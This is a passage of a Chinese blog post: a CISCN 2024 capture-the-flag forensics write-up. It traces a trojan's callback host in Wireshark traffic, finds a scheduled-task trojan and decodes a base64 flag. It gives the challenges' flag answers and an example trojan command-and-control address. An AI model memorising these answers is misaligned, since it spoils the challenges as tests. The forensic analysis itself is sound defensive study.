+<li><code>Wireshark</code>看看包，先全局搜索下<code>miscsecure</code>,没有，那咱们一个字符一个字符删看看，一下看到一个<code>.exe</code>.</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826118.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>这个<code>exe</code>文件大概率是马,点开看，与咱们一开始<code>net</code>的对上了，刚刚那个<code>miscsecure</code>应该是<code>192.168.116.130</code></li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826994.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;miscsecure.com:<span class="hljs-number">192.168</span><span class="hljs-number">.116</span><span class="hljs-number">.130</span>:<span class="hljs-number">443</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="WinFT-2"><a href="#WinFT-2" class="headerlink" title="WinFT_2"></a>WinFT_2</h3><ul>
+<li>查看任务计划程序，很明显的定时启动木马</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826135.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>base64</code></li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826302.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">Nice，flag <span class="hljs-keyword">is</span> &#123;AES_encryption_algorithm_is_an_excellent_encryption_algorithm&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h3><p>打开表格，搜索134.6.4.12，tcp中最早的即为所求</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241827813.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2024-CISCN-XU17</div>
+      <div>http://example.com/2024/12/15/2024-CISCN-XU17/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XU17</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              XU17
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" title="SSTI-fenjing-思路总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSTI-fenjing-思路总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
